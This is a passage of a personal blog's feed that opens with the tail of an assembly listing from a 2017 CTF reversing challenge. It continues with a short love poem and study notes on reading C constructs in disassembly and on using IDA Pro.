good message in code segment</span><br><span class="line">    pop eax</span><br><span class="line">    push eax</span><br><span class="line">    mov edi, eax</span><br><span class="line">    ;push 20756f59</span><br><span class="line">    push 4e000969           ;first dword</span><br><span class="line">    pop eax</span><br><span class="line">    ;use ebx,edx value</span><br><span class="line">    xor eax, edx</span><br><span class="line">    stosd</span><br><span class="line">    ;push 20746567</span><br><span class="line">    xor eax, 10a3e          ;second dword</span><br><span class="line">    stosd</span><br><span class="line">    ;push 217469</span><br><span class="line">    xor eax, ebx            ;22706b8c, third dword</span><br><span class="line">    xor eax, 22511e14</span><br><span class="line">    stosd</span><br><span class="line">    ;mov eax, 401044</span><br><span class="line">    xor eax, 61642d</span><br><span class="line">    jmp ret1</span><br><span class="line">bad_boy:</span><br><span class="line">    ;mov eax, 40103f</span><br><span class="line">    pop eax         ;eax=413131, addr of very2</span><br><span class="line">    xor eax, 1210e</span><br><span class="line">ret1:</span><br><span class="line">    xor eax, DWORD ptr cFlag</span><br><span class="line">    jmp eax</span><br><span class="line">    nop</span><br><span class="line">    ;ret</span><br><span class="line"> </span><br><span class="line">very2   endp</span><br></pre></td></tr></table></figure><hr><p>完结</p><p>From <a href="https://kabeor.github.io/看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc/">https://kabeor.github.io/看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;看雪-TSRC-2017CTF秋季赛-ctf2017-Fpc&quot;&gt;&lt;a href=&quot;#看雪-TSRC-2017CTF秋季赛-ctf2017-Fpc&quot; class=&quot;headerlink&quot; title=&quot;看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc&quot;&gt;
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向，缓冲区溢出" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8C%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>Miss You</title>
    <link href="https://kabeor.github.io/Miss%20You/"/>
    <id>https://kabeor.github.io/Miss You/</id>
    <published>2018-04-22T11:30:52.362Z</published>
    <updated>2018-07-16T09:31:35.383Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Miss-You"><a href="#Miss-You" class="headerlink" title="Miss You"></a>Miss You</h1><hr><blockquote><p>思念你的眼眸，是从那一刻<br>悄然开始的</p><p>情不知所起，一往而深</p><p>清风湿润，茶烟轻扬<br>汝携芳华，踏入吾梦<br>一花一草，一木一字<br>满天星辰，何不是你</p><p>思念一重一重<br>点缀万家灯火<br>眷恋一天一天<br>跨过寒暑昏昼</p><p>It ‘s sweet of that sugar<br>Cherish every second spend with you<br>Don’t doubt<br>That’s how you make me feel</p><p>Everybody knows I love you bady</p><p>The faster time passes, the more I miss you</p></blockquote><hr><p>为七天前的你写下这段话</p><p>2018/4/22 19:31:16 </p><p>From <a href="https://kabeor.github.io/Miss You/">https://kabeor.github.io/Miss You/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Miss-You&quot;&gt;&lt;a href=&quot;#Miss-You&quot; class=&quot;headerlink&quot; title=&quot;Miss You&quot;&gt;&lt;/a&gt;Miss You&lt;/h1&gt;&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;思念你的眼眸，是从那一刻&lt;br&gt;悄然开始的&lt;/p&gt;
&lt;p
      
    
    </summary>
    
    
      <category term="You" scheme="https://kabeor.github.io/tags/You/"/>
    
  </entry>
  
  <entry>
    <title>第6章 识别汇编中的C代码结构</title>
    <link href="https://kabeor.github.io/%E7%AC%AC6%E7%AB%A0%20%E8%AF%86%E5%88%AB%E6%B1%87%E7%BC%96%E4%B8%AD%E7%9A%84C%E4%BB%A3%E7%A0%81%E7%BB%93%E6%9E%84/"/>
    <id>https://kabeor.github.io/第6章 识别汇编中的C代码结构/</id>
    <published>2018-04-11T12:54:08.643Z</published>
    <updated>2018-07-19T05:20:52.530Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第6章-识别汇编中的C代码结构"><a href="#第6章-识别汇编中的C代码结构" class="headerlink" title="第6章 识别汇编中的C代码结构"></a>第6章 识别汇编中的C代码结构</h1><h2 id="6x1-全局与局部变量"><a href="#6x1-全局与局部变量" class="headerlink" title="6x1 全局与局部变量"></a>6x1 全局与局部变量</h2><blockquote><p>全局变量可以被一个程序中的任意函数访问和使用<br>局部变量只能在它被定义的函数中访问</p></blockquote><p>在反汇编代码中： </p><p><strong>全局变量通过内存地址引用</strong><br><strong>局部变量通过栈地址引用</strong></p><h2 id="6x2-反汇编算术操作"><a href="#6x2-反汇编算术操作" class="headerlink" title="6x2 反汇编算术操作"></a>6x2 反汇编算术操作</h2><blockquote><p><strong>C代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f7218cec.jpg" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f724a277.jpg" alt="mark"></p></blockquote><p>反汇编中，1~2行为赋值，3~5行为a=a+11，6~9行为a=a-b，10~12和13~15分别为a–和b++，16~19为b=a%3</p><h2 id="6x3-识别if语句"><a href="#6x3-识别if语句" class="headerlink" title="6x3 识别if语句"></a>6x3 识别if语句</h2><blockquote><p><strong>C代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f7260e22.jpg" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f72760c1.jpg" alt="mark"></p></blockquote><p>cmp比较var_4是否等于var_8</p><h3 id="1-用IDA-Pro图形化分析函数"><a href="#1-用IDA-Pro图形化分析函数" class="headerlink" title="1. 用IDA Pro图形化分析函数"></a>1. 用IDA Pro图形化分析函数</h3><p><img src="https://i.loli.net/2018/07/19/5b501f72992fc.jpg" alt="mark"></p><h3 id="2-识别嵌套的if语句"><a href="#2-识别嵌套的if语句" class="headerlink" title="2. 识别嵌套的if语句"></a>2. 识别嵌套的if语句</h3><blockquote><p><strong>C代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f72ad72e.jpg" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f72d0602.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/19/5b501f72e9ab6.jpg" alt="mark"></p></blockquote><h2 id="6x4-识别循环"><a href="#6x4-识别循环" class="headerlink" title="6x4 识别循环"></a>6x4 识别循环</h2><h3 id="1-找到for循环"><a href="#1-找到for循环" class="headerlink" title="1. 找到for循环"></a>1. 找到for循环</h3><blockquote><p><strong>C代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f7312652.jpg" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f7381097.jpg" alt="mark"></p><p><strong>IDA Pro图形化</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f86da225.jpg" alt="mark"></p></blockquote><p>汇编代码中，for循环可通过以下4个组件识别出来</p><blockquote><p>初始化<br>比较<br>执行指令<br>递增/递减</p></blockquote><h3 id="2-找到while循环"><a href="#2-找到while循环" class="headerlink" title="2. 找到while循环"></a>2. 找到while循环</h3><blockquote><p><strong>C代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f8751178.jpg" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f8764b45.jpg" alt="mark"></p></blockquote><p>汇编代码和for循环非常相似，唯一区别在于它缺少一个递增</p><h2 id="6x5-理解函数调用约定"><a href="#6x5-理解函数调用约定" class="headerlink" title="6x5 理解函数调用约定"></a>6x5 理解函数调用约定</h2><blockquote><p><strong>一个函数调用的伪代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f8779503.jpg" alt="mark"></p></blockquote><p>最常见的三个调用约定：cdecl，stdcall，fastcall</p><h3 id="1-cdecl"><a href="#1-cdecl" class="headerlink" title="1. cdecl"></a>1. cdecl</h3><p><img src="https://i.loli.net/2018/07/19/5b501f879153f.jpg" alt="mark"></p><p>在cdecl约定中，参数从右到左按序被压入栈，当函数完成时由调用者清理栈。</p><h3 id="2-stdcall"><a href="#2-stdcall" class="headerlink" title="2. stdcall"></a>2. stdcall</h3><p>stdcall是Windows API的标准调用约定。任何调用这些API的代码都不需要清理栈，清理栈由实现API函数代码的DLL程序所承担</p><h3 id="3-fastcall"><a href="#3-fastcall" class="headerlink" title="3. fastcall"></a>3. fastcall</h3><p>在fastcall中，前面的一些参数被传到寄存器，备用的寄存器是EDX和ECX。如果需要，剩下的参数再以从右到左的次序被加载到栈上。<br>使用fastcall比其他约定更高效，因为代码不需要涉及过多的栈操作</p><h3 id="4-压栈与移动"><a href="#4-压栈与移动" class="headerlink" title="4. 压栈与移动"></a>4. 压栈与移动</h3><blockquote><p><strong>C代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f87a906f.jpg" alt="mark"></p><p><strong>adder函数汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f87c20db.jpg" alt="mark"></p><p><strong>使用两种不同调用约定时一个函数调用的汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f87d5f2a.jpg" alt="mark"></p></blockquote><h2 id="6x6-分析switch语句"><a href="#6x6-分析switch语句" class="headerlink" title="6x6 分析switch语句"></a>6x6 分析switch语句</h2><p>switch语句通常以两种方式被编译：</p><ol><li>if样式</li><li>跳转表</li></ol><h3 id="1-if样式"><a href="#1-if样式" class="headerlink" title="1. if样式"></a>1. if样式</h3><blockquote><p><strong>C代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f87e703c.jpg" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f880c31f.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/19/5b501f9daa16e.jpg" alt="mark"></p><p><strong>IDA Pro图形化</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f9dd4356.jpg" alt="mark"></p></blockquote><h3 id="2-跳转表"><a href="#2-跳转表" class="headerlink" title="2. 跳转表"></a>2. 跳转表</h3><blockquote><p><strong>C代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f9dece2d.jpg" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f9e12198.jpg" alt="mark"></p><p><strong>IDA Pro图形化</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f9e36c12.jpg" alt="mark"></p></blockquote><h2 id="6x7-反汇编数组"><a href="#6x7-反汇编数组" class="headerlink" title="6x7 反汇编数组"></a>6x7 反汇编数组</h2><blockquote><p><strong>C代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f9e4d524.jpg" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f9e62590.jpg" alt="mark"></p></blockquote><p>数组a的基地址对应var_14，数组b的基地址对应dword_40A000.</p><p>ecx被作为索引使用，它被乘以4，来指明元素的大小，结果值与数组的基地址相加，来访问正确的数组元素。</p><h2 id="6x8-识别结构体"><a href="#6x8-识别结构体" class="headerlink" title="6x8 识别结构体"></a>6x8 识别结构体</h2><blockquote><p><strong>C代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f9e7869e.jpg" alt="mark"></p><p><strong>main函数反汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f9e8ef54.jpg" alt="mark"></p><p><strong>test函数反汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f9ea93bc.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/19/5b501faf4c785.jpg" alt="mark"></p></blockquote><p>arg_0是这个结构体的基地址，偏移0x14保存了结构中的字符，并且0x61对应ASCII中的字母a</p><h2 id="6x9-分析链表遍历"><a href="#6x9-分析链表遍历" class="headerlink" title="6x9 分析链表遍历"></a>6x9 分析链表遍历</h2><blockquote><p><strong>C代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501faf632ab.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/19/5b501faf7be8b.jpg" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501faf96083.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/19/5b501fafb3fab.jpg" alt="mark"></p></blockquote><p>var_C对应i，它是这个循环的计数。<br>var_8对应head变量。<br>var_4是一个指向拥有两个被赋值变量结构体的指针</p><p>From <a href="https://kabeor.github.io/第6章 识别汇编中的C代码结构/">https://kabeor.github.io/第6章 识别汇编中的C代码结构/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第6章-识别汇编中的C代码结构&quot;&gt;&lt;a href=&quot;#第6章-识别汇编中的C代码结构&quot; class=&quot;headerlink&quot; title=&quot;第6章 识别汇编中的C代码结构&quot;&gt;&lt;/a&gt;第6章 识别汇编中的C代码结构&lt;/h1&gt;&lt;h2 id=&quot;6x1-全局与局部变量&quot;&gt;
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
      <category term="第二篇 静态分析高级技术篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%8C%E7%AF%87-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第5章 IDA Pro</title>
    <link href="https://kabeor.github.io/%E7%AC%AC5%E7%AB%A0%20IDA%20Pro/"/>
    <id>https://kabeor.github.io/第5章 IDA Pro/</id>
    <published>2018-04-01T11:00:07.280Z</published>
    <updated>2018-07-19T05:18:43.943Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第5章-IDA-Pro"><a href="#第5章-IDA-Pro" class="headerlink" title="第5章 IDA Pro"></a>第5章 IDA Pro</h1><p>本章介绍了IDA Pro的使用方法，本文就只大致记录常用功能</p><h2 id="5x1-加载一个可执行文件"><a href="#5x1-加载一个可执行文件" class="headerlink" title="5x1 加载一个可执行文件"></a>5x1 加载一个可执行文件</h2><p>默认情况下，IDA Pro反汇编代码中不包含PE头或资源节，这些地方常被恶意代码用来隐藏恶意指令，我们可以指定手动加载</p><h2 id="5x2-IDA-Pro接口"><a href="#5x2-IDA-Pro接口" class="headerlink" title="5x2 IDA Pro接口"></a>5x2 IDA Pro接口</h2><h3 id="1-反汇编窗口模式"><a href="#1-反汇编窗口模式" class="headerlink" title="1. 反汇编窗口模式"></a>1. 反汇编窗口模式</h3><blockquote><p>图形模式</p></blockquote><p>显示行号的操作码：Options-&gt;General，选择Line prefixes并设置Number of Opcode Bytes为6.（如果这些设置让所有指令都在屏幕右对齐，尝试设置Instruction Indentation为8）</p><p>箭头颜色：</p><ol><li>红色：一个条件跳转没有被采用</li><li>绿色：这个条件跳转被采用</li><li>蓝色：一个无条件跳转被采用</li></ol><blockquote><p>文本模式</p></blockquote><p>打开自动注释： Options-&gt;General，选择Auto comments</p><h3 id="2-对分析有用的窗口"><a href="#2-对分析有用的窗口" class="headerlink" title="2. 对分析有用的窗口"></a>2. 对分析有用的窗口</h3><blockquote><p>函数窗口<br>名字窗口<br>字符串窗口<br>导入表窗口<br>导入表窗口<br>结构窗口</p></blockquote><h3 id="3-返回到默认窗口"><a href="#3-返回到默认窗口" class="headerlink" title="3. 返回到默认窗口"></a>3. 返回到默认窗口</h3><p>Windows-&gt;Reset Desktop<br>Windows-&gt;Save desktop   保存新视图</p><h3 id="4-导航IDA-Pro"><a href="#4-导航IDA-Pro" class="headerlink" title="4. 导航IDA Pro"></a>4. 导航IDA Pro</h3><blockquote><p>使用链接和交叉引用<br>浏览历史<br>导航栏</p><pre><code>1. 浅蓝色： 被FLIRT识别的库代码2. 红色： 编译器生成的代码3. 深蓝色： 用户编写的代码4. 粉红色： 导入的数据5. 灰色： 已定义的数据6. 棕色： 未定义的数据</code></pre><p>跳转到位置   <strong>G</strong></p></blockquote><h3 id="5-搜索"><a href="#5-搜索" class="headerlink" title="5. 搜索"></a>5. 搜索</h3><blockquote><p>Search-&gt;Next Code  移动光标到包含你所指定的指令的下一个位置<br>Search-&gt;Text  在整个反汇编窗口中搜索一个指定的字符串<br>Search-&gt;Sequence of Bytes  在十六进制视图窗口中对一个特定字节序列执行二进制搜索</p></blockquote><h2 id="5x3-使用交叉引用"><a href="#5x3-使用交叉引用" class="headerlink" title="5x3 使用交叉引用"></a>5x3 使用交叉引用</h2><p>交叉引用（xref）<br>查看一个函数的所有交叉引用：单机函数名并按X键</p><h2 id="5x4-分析函数"><a href="#5x4-分析函数" class="headerlink" title="5x4 分析函数"></a>5x4 分析函数</h2><p>创建函数：  P<br>无法识别出基于EBP的一个栈帧的修复： 按Alt+P，选择BP Based Frame，然后指定4 bytes for Saved Registers</p><h2 id="5x5-使用图形选项"><a href="#5x5-使用图形选项" class="headerlink" title="5x5 使用图形选项"></a>5x5 使用图形选项</h2><p><img src="https://i.loli.net/2018/07/19/5b501e9930e37.jpg" alt="mark"></p><h2 id="5x6-增强反汇编"><a href="#5x6-增强反汇编" class="headerlink" title="5x6 增强反汇编"></a>5x6 增强反汇编</h2><p>IDA Pro没有撤销</p><ol><li>重命名</li><li>注释：将光标放在反汇编的某行上，并按冒号（:）</li><li>格式化操作数</li><li>使用命名的常量—-手动加载有关类型库：选择View-&gt;Open Subviews-&gt;Type Libraries</li><li>重新定义代码和数据<ol><li>按U取消函数，代码或数据的定义</li><li>按C定义原始字节为代码</li><li>按D定义原始字节为数据</li><li>按A定义原始字节为ASCII字符串</li></ol></li></ol><h2 id="5x7-用插件扩展IDA"><a href="#5x7-用插件扩展IDA" class="headerlink" title="5x7 用插件扩展IDA"></a>5x7 用插件扩展IDA</h2><h3 id="1-IDC脚本"><a href="#1-IDC脚本" class="headerlink" title="1. IDC脚本"></a>1. IDC脚本</h3><p>File-&gt;Script File   简单运行<br>File-&gt;IDC Command  作为单独命令运行</p><h3 id="2-IDAPython"><a href="#2-IDAPython" class="headerlink" title="2. IDAPython"></a>2. IDAPython</h3><h3 id="3-使用商业插件"><a href="#3-使用商业插件" class="headerlink" title="3. 使用商业插件"></a>3. 使用商业插件</h3><p>Hex-Rays生成伪代码<br>zynamics BinDiff比较两个IDA Pro数据库</p><p>From <a href="https://kabeor.github.io/第5章 IDA Pro/">https://kabeor.github.io/第5章 IDA Pro/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第5章-IDA-Pro&quot;&gt;&lt;a href=&quot;#第5章-IDA-Pro&quot; class=&quot;headerlink&quot; title=&quot;第5章 IDA Pro&quot;&gt;&lt;/a&gt;第5章 IDA Pro&lt;/h1&gt;&lt;p&gt;本章介绍了IDA Pro的使用方法，本文就只大致记录常用功能&lt;/p&gt;
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
      <category term="第二篇 静态分析高级技术篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%8C%E7%AF%87-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
